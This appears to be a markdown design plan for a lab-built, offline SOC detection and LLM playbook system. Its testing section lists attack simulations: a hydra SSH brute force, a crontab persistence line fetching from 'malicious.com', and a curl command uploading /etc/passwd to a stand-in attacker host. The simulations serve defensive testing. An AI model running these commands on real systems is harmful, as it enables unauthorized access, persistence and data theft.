@@ -1,0 +1,481 @@
+
+# 🏗 SYSTEM ARCHITECTURE (2 Machines)
+
+### 🖥 Machine 1 — Target (Simulated Bank Server)
+
+Role:
+
+* Generates logs
+* Runs services (SSH, web, database simulation)
+* Produces EDR-style telemetry
+
+### 🖥 Machine 2 — SOC Engine (Your AI System)
+
+Role:
+
+* Log collector
+* Correlation engine
+* UEBA engine
+* Cache engine
+* Playbook generator
+* API server
+
+---
+
+# 🔁 FULL WORKFLOW EXPANDED (VERY DETAILED)
+
+We now expand the 5 steps into a real operational pipeline.
+
+---
+
+# STEP 0 — LOG COLLECTION (EDR + SIEM SIMULATION)
+
+## On Machine 1 (Target)
+
+Enable:
+
+### 1️⃣ auditd (EDR-like telemetry)
+
+Captures:
+
+* execve (command execution)
+* file changes
+* privilege escalation
+* network syscalls
+
+Install:
+
+```bash
+sudo apt install auditd
+```
+
+Add rules:
+
+```bash
+-w /etc/passwd -p wa -k passwd_changes
+-w /etc/sudoers -p wa -k sudo_mod
+-a always,exit -F arch=b64 -S execve -k command_exec
+```
+
+---
+
+### 2️⃣ Auth Logs
+
+`/var/log/auth.log`
+
+* SSH attempts
+* sudo usage
+* failed logins
+
+---
+
+### 3️⃣ System Logs
+
+`/var/log/syslog`
+
+---
+
+## Log Shipping (No ELK)
+
+Use:
+
+* Python log forwarder
+* Or rsyslog forwarding
+* Or simple SCP pull every X seconds
+
+Recommended minimal:
+
+Machine 2 runs:
+
+```bash
+scp user@machine1:/var/log/auth.log .
+scp user@machine1:/var/log/audit/audit.log .
+```
+
+Or build small Python socket receiver.
+
+---
+
+# STEP 1 — DETECT INCIDENT
+
+On Machine 2:
+
+### 1️⃣ Log Normalization Layer
+
+Convert all logs into unified JSON schema:
+
+```json
+{
+  "timestamp": "...",
+  "host": "server1",
+  "user": "john",
+  "event_type": "process_exec",
+  "command": "curl malicious",
+  "source_ip": "185.x.x.x",
+  "severity": 0,
+  "raw_log": "..."
+}
+```
+
+This is CRITICAL.
+
+Without normalization, correlation fails.
+
+---
+
+### 2️⃣ Feature Extraction (Behavioral Analytics)
+
+Use:
+
+* tsfresh → extract time-based features
+* PyOD → anomaly detection
+
+Example:
+
+* Average SSH login frequency per user
+* Command frequency baseline
+* New process anomaly score
+
+Output:
+
+```json
+{
+  "anomaly_score": 0.87,
+  "behavior_deviation": true
+}
+```
+
+If score > threshold → incident candidate
+
+---
+
+# STEP 2 — COMPUTE PATTERN FINGERPRINT
+
+Now we create a deterministic pattern ID.
+
+You must build:
+
+### Event Window Aggregator
+
+Group events by:
+
+* User
+* Host
+* Time window (e.g., 10 min)
+
+Example window:
+
+* 12 failed SSH
+* 1 successful SSH
+* 1 sudo command
+* 1 curl execution
+
+Now create pattern object:
+
+```json
+{
+  "failed_ssh": 12,
+  "successful_ssh": 1,
+  "sudo_exec": true,
+  "curl_exec": true
+}
+```
+
+Now generate fingerprint:
+
+```python
+import hashlib
+pattern_string = "failed_ssh>10|sudo_exec|curl_exec"
+pattern_hash = hashlib.sha256(pattern_string.encode()).hexdigest()
+```
+
+This becomes:
+
+```
+pattern_id
+```
+
+---
+
+# STEP 3 — CHECK CACHE
+
+Cache structure (Machine 2):
+
+Use:
+
+* Redis (recommended)
+  OR
+* SQLite (simpler)
+  OR
+* JSON file store (minimal)
+
+Cache entry:
+
+```json
+{
+  "pattern_id": "...",
+  "playbook": [...],
+  "validated": true,
+  "severity": "high"
+}
+```
+
+If pattern_id exists:
+→ Skip LLM
+→ Return stored playbook
+
+This gives:
+
+* Instant response
+* Deterministic output
+* Reduced compute
+
+---
+
+# STEP 4 — IF MATCH → RETURN PRE-APPROVED PLAYBOOK
+
+Return structured steps:
+
+```json
+{
+  "incident_type": "Credential Compromise",
+  "severity": "High",
+  "response_steps": [
+    "Disable user account",
+    "Block source IP via firewall",
+    "Inspect /etc/sudoers",
+    "Check cron jobs",
+    "Collect forensic logs"
+  ]
+}
+```
+
+Also log response time.
+
+---
+
+# STEP 5 — IF NO MATCH → USE LLM
+
+Use:
+
+* Ollama (Mistral / Llama locally)
+* HuggingFace model offline
+
+Prompt structure (VERY IMPORTANT):
+
+```
+You are a Linux SOC analyst.
+Given the following incident summary:
+
+Failed SSH: 12
+Successful SSH: 1
+Sudo execution: Yes
+Curl execution: Yes
+
+Generate:
+1. Incident classification
+2. Severity
+3. Step-by-step containment plan
+4. Forensic preservation steps
+5. Long-term remediation
+```
+
+Force structured JSON output.
+
+---
+
+# STEP 6 — VALIDATION LAYER (CRITICAL)
+
+Do not blindly trust LLM.
+
+Add:
+
+### 1️⃣ Rule-based validator
+
+* Check if recommended steps include:
+
+  * Account isolation
+  * IP blocking
+  * Log preservation
+
+If missing critical containment → flag low quality.
+
+### 2️⃣ Containment Simulation Check
+
+If disabling user stops attack chain → valid.
+
+---
+
+# STEP 7 — STORE IF APPROVED
+
+If playbook passes validation:
+
+Store in cache with:
+
+* pattern_id
+* timestamp
+* success score
+* response time
+
+Now next time → instant retrieval.
+
+---
+
+# ALERT GENERATION DESIGN
+
+Alert triggers when:
+
+* anomaly_score > threshold
+  OR
+* correlation rule triggered
+
+Severity calculation:
+
+```
+severity = anomaly_score × impact_weight × asset_value
+```
+
+Example:
+Banking DB server = high impact
+Dev test server = medium impact
+
+---
+
+# TESTING TECHNIQUES (2 MACHINES)
+
+Now critical part.
+
+You test using controlled attack scripts.
+
+---
+
+## ATTACK SCENARIOS TO SIMULATE
+
+### 1️⃣ SSH Brute Force
+
+From Machine 2:
+
+```bash
+hydra -l test -P passwords.txt ssh://machine1
+```
+
+Expected detection:
+
+* Multiple failed login
+* Anomaly spike
+* Pattern created
+
+---
+
+### 2️⃣ Successful Compromise + Sudo
+
+Login successfully:
+
+```bash
+ssh user@machine1
+sudo useradd hacker
+```
+
+Expected:
+
+* Privilege escalation pattern
+
+---
+
+### 3️⃣ Persistence
+
+```bash
+echo "* * * * * curl malicious.com" >> /etc/crontab
+```
+
+Expected:
+
+* File modification alert
+
+---
+
+### 4️⃣ Data Exfiltration Simulation
+
+```bash
+curl http://attacker-ip/upload -d @/etc/passwd
+```
+
+Expected:
+
+* Suspicious outbound connection
+* High severity
+
+---
+
+# EVALUATION METRICS
+
+For each attack:
+
+Measure:
+
+1. Detection time
+2. Correct classification
+3. Playbook coverage score
+4. Containment success
+5. False positive rate
+
+Create evaluation table:
+
+| Scenario | Detected | Correct Severity | Playbook Valid | Cached Next Time |
+| -------- | -------- | ---------------- | -------------- | ---------------- |
+
+---
+
+# COMPLETE TECH STACK
+
+## Machine 1 (Target)
+
+* Ubuntu
+* auditd
+* rsyslog
+* SSH server
+
+## Machine 2 (SOC Engine)
+
+* Python 3.11
+* FastAPI
+* Redis (or SQLite)
+* PyOD
+* tsfresh
+* Ollama
+* hashlib
+* multiprocessing
+* cron scheduler
+
+No ELK.
+No external APIs.
+Fully offline.
+
+---
+
+# FINAL PIPELINE SUMMARY
+
+```
+Logs → Normalize → Feature Extract → Anomaly Score
+       ↓
+Correlation Window
+       ↓
+Pattern Fingerprint
+       ↓
+Cache Lookup
+       ↓
+(If Hit) → Return Playbook
+(If Miss) → LLM → Validate → Store → Return
+```
+
+---
+
+# WHY THIS IS STRONG
+
+✔ Simulates SIEM + EDR
+✔ Offline
+✔ Deterministic when known
+✔ Adaptive when novel
+✔ Research-measurable
+✔ Scalable
+
